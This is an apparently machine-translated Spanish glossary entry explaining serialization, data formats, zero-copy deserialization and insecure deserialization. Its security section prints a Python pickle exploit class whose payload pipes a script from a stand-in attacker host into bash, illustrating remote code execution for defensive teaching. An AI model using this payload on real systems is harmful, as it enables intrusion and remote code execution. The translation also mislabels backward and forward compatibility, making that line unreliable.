# ¿Qué es Serialization?

*Glosario · Dev · Última actualización: 19 de septiembre de 2026*

La serialización es el proceso de convertir objetos, estructuras de datos y gráficos de punteros asignados dinámicamente en la memoria de trabajo (RAM) de un lenguaje de programación en un flujo de bytes plano y lineal o en un formato de texto que puede transmitirse a través de una red o almacenarse en un disco.

## ¿Qué significa la serialización y por qué es obligatoria? Modelo de memoria

En los sistemas operativos modernos, cada proceso se ejecuta en su propio espacio de direcciones virtuales aislado. Un objeto en tiempo de ejecución; Contiene variables locales en la pila, bloques de memoria asignados dinámicamente en el montón, punteros de función (vtable) y direcciones de referencia (0x7ffee4b2...).

Esta estructura de memoria no puede copiarse directamente a otro entorno por dos razones fundamentales:

1. Aislamiento del espacio de direcciones: los punteros de memoria solo tienen significado en la tabla de direcciones virtuales del proceso que se está ejecutando actualmente. Cuando envía un puntero de memoria a otro proceso en el mismo servidor o a un cliente en la red, se produce un acceso a la memoria no válido (fallo de segmentación) o corrupción de la memoria en el sistema de destino.
2. Diferencias de arquitectura y endianidad: las diferentes arquitecturas de procesador (por ejemplo, hardware de red Little-Endian x86-64 frente a Big-Endian) mantienen números enteros multibyte y números de punto flotante en la memoria en diferentes ordenes de bytes. Además, los anchos de los punteros y las alineaciones de los datos (alineación/relleno) son diferentes en los sistemas de 32 y 64 bits.

El mecanismo de serialización recorre el gráfico de objetos en la memoria (incluidas las referencias circulares) en profundidad o en anchura (recorrido de grafos), convierte los punteros locales en relaciones lógicas y coloca los datos en una secuencia de bytes canónica independiente de la plataforma.

***Analogía:** Es como desmontar un mueble para transportarlo y colocarlo en una caja plana; al llegar al destino, abres la caja y, siguiendo el manual, vuelves a montar el mueble (deserialization).*

## Formatos de serialización: Basados en texto vs. Binarios

Elegir el formato de serialización correcto en la arquitectura de software requiere un equilibrio entre la legibilidad humana, el costo de análisis (parsing) de CPU, el ancho de banda de red y la seguridad de tipos.

- JSON (notación de objetos JavaScript): el estándar de facto de la web moderna y las API RESTful. Es independiente del idioma, compatible de forma nativa con los navegadores y los desarrolladores pueden leerlo y depurarlo fácilmente.
- Debilidades: El análisis basado en texto (lexing, tokenización, conversiones de cadena a número) consume una gran cantidad de CPU. La repetición de nombres de claves (claves de campo) en cada registro crea una sobrecarga de carga útil innecesaria. Además, transportar datos binarios (por ejemplo, una imagen o una clave cifrada) requiere codificación Base64; Esto infla el tamaño de los datos en aproximadamente un 33%.

- Búfers de protocolo (Protobuf): es un formato binario desarrollado por Google que forma la columna vertebral de gRPC y la comunicación de microservicios. Define tipos de campos y números de campos (etiquetas de campos) con un archivo de esquema sólido (.proto). En lugar de claves de texto, se envían a través de la red etiquetas numéricas y codificación de enteros de longitud variable (Varint). Consume de 3 a 10 veces menos ancho de banda que JSON y analiza mucho más rápido.
- Apache Avro: Común en el ecosistema de big data (Hadoop, Kafka). El esquema se mantiene en un registro central (Registro de esquemas) en lugar de estar integrado en cada mensaje. De esta forma se minimiza la carga adicional por mensaje.
- MessagePack y BSON: almacena datos en un formato comprimido binario, preservando el modelo clave-valor flexible y sin esquema de JSON.

## Arquitectura de deserialización de copia cero (Zero-Copy)

En las bibliotecas de serialización clásicas (analizadores JSON o Protobuf estándar), el proceso de deserialización se lleva a cabo con los siguientes pasos:

1. El flujo de bytes proveniente del socket de red se escribe en un búfer temporal.
2. El analizador escanea los bytes y verifica los tipos.
3. Se asigna nueva memoria para cada objeto, cadena y matriz en el área de memoria del montón (malloc o el administrador de memoria del idioma).
4. Los valores se copian desde el búfer temporal a los objetos del montón recién creados.

En sistemas donde se procesan cientos de miles de solicitudes por segundo, estas asignaciones de montón y operaciones de copia provocan un alto consumo de CPU y pausas del recolector de basura (Garbage Collector).

**Enfoque de copia cero (Zero-Copy) (FlatBuffers, Cap'n Proto):** En estas bibliotecas, cuando se serializan los datos, se colocan en un búfer binario de acuerdo con la alineación de la estructura de datos en memoria y las direcciones de desplazamiento relativo.

No se realiza ninguna asignación de memoria ni copia de datos durante la fase de deserialización. La aplicación asigna el búfer de bytes entrante directamente a la memoria (mmap) y accede a los campos del objeto mediante aritmética de punteros directa. El tiempo de deserialización es efectivamente de 0 milisegundos. Esta arquitectura es estándar en el trading de alta frecuencia (HFT), la computación de borde (Edge AI) y los motores de juegos AAA.

## Dimensión de seguridad: Deserialización insegura (CWE-502)

Surgen vulnerabilidades de seguridad catastróficas cuando la serialización intenta serializar clases de objetos y comportamientos de tiempo de ejecución en lugar de simplemente mover datos puros. La deserialización insegura (Serialización inversa insegura), que se encuentra en la lista OWASP Top 10, permite al atacante ejecutar código arbitrario (Ejecución remota de código - RCE) en el sistema.

El módulo de serialización integrado de Python, pickle, serializa el método __reduce__ de objetos. Este método define una función y sus parámetros que se llamarán durante la deserialización del objeto. Al abusar de este mecanismo, un atacante puede generar una secuencia de bytes maliciosa que ejecuta un comando del sistema operativo:

```
# Saldırgan tarafından hazırlanan zararlı serileştirme paketi
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl -s https://attacker.com/steal.sh | bash',))
```

Tan pronto como este flujo de bytes se envía al servidor y se ejecuta pickle.loads(payload), se ejecuta un comando de shell no autorizado en el servidor. Por lo tanto, los datos de fuentes no confiables no deben analizarse con pickle.

En el mecanismo de serialización nativo de Java (ObjectInputStream.readObject()), el cargador de clases carga la clase del objeto entrante en la memoria. Agresor; Puede construir una cadena de ejecución que ejecuta comandos en la memoria conectando los métodos de las clases en las bibliotecas instaladas en el sistema (por ejemplo, Apache Commons Collections o Spring Framework) (cadena de dispositivos).

- Nunca utilice formatos integrados en el lenguaje que contengan código ejecutable o definiciones de clases (Python pickle, serialización nativa de Java, PHP deserializar) en los límites de la red.
- Prefiera formatos que solo transporten datos puros y validen la estructura de datos según un esquema (validación de esquema estricta) (JSON + Pydantic/Zod o Protobuf).
- Implemente autenticación y control de integridad de mensajes (HMAC o TLS) en los intercambios de datos binarios.

## Preguntas frecuentes

**¿Cuál es la diferencia fundamental entre Serialization y Deserialization?**

La serialización es el proceso de convertir objetos vivos en memoria en un flujo de bytes o texto que se puede almacenar o transmitir. La deserialización es el proceso de leer y analizar esta secuencia de bytes para convertirla nuevamente en un objeto funcional en la memoria del sistema de destino.

**¿Cuándo se deben usar Protobuf o FlatBuffers en lugar de JSON en proyectos web?**

Para clientes web abiertos a internet y APIs públicas, JSON es ideal debido a la compatibilidad con navegadores y la facilidad de depuración. Sin embargo, para microservicios internos, backends de aplicaciones móviles o flujos de datos en tiempo real, se deben preferir Protobuf o FlatBuffers para reducir el ancho de banda de la red y el costo de procesamiento de la CPU.

**¿Cómo funciona un ataque de Insecure Deserialization y cómo se puede prevenir?**

El atacante inyecta estructuras de funciones o clases maliciosas en los datos serializados que se ejecutarán durante la deserialización. Cuando el servidor analiza estos datos, se pueden activar comandos del sistema. Para prevenirlo, se deben abandonar los formatos que transportan lógica de clases y utilizar solo formatos con esquema que transporten datos puros (Protobuf, JSON Schema).

**¿Qué significa la deserialización de copia cero (Zero-copy deserialization)?**

Es una técnica para leer datos directamente mediante punteros de desplazamiento en el búfer de memoria, en lugar de asignar nuevas áreas de memoria y copiar el flujo de bytes entrante. Al eliminar la asignación de memoria, se alivia la carga del procesador y del recolector de basura.

**¿Qué es la evolución del esquema (Schema Evolution); cómo se garantiza la compatibilidad hacia atrás y hacia adelante?**

Los modelos de datos cambian a medida que se actualiza el software. Sistemas como Protobuf y Avro otorgan ID numéricos únicos a los campos, lo que permite a los clientes antiguos ignorar campos nuevos (compatibilidad con versiones anteriores) y a los clientes nuevos leer datos antiguos con valores predeterminados (compatibilidad con versiones anteriores).

## Términos relacionados

- [API](https://trescout.com/es/dictionary/api/)
- [Data Pipeline](https://trescout.com/es/dictionary/data-pipeline/)
- [Memory Management](https://trescout.com/es/dictionary/memory-management/)
- [Network Stack](https://trescout.com/es/dictionary/network-stack/)

## Herramientas relacionadas

- [YAML Cpp](https://trescout.com/es/discover/yaml-cpp/)

Esta explicación se redactó en lenguaje sencillo para TreScout y se **tradujo automáticamente** del original en turco · prevalece la versión turca. Si algo le parece erróneo o incompleto, escriba a [hello@trescout.com](mailto:hello@trescout.com). [Leer en turco →](https://trescout.com/dictionary/serialization/)

---
Fuente: TreScout Glosario · https://trescout.com/es/dictionary/serialization/
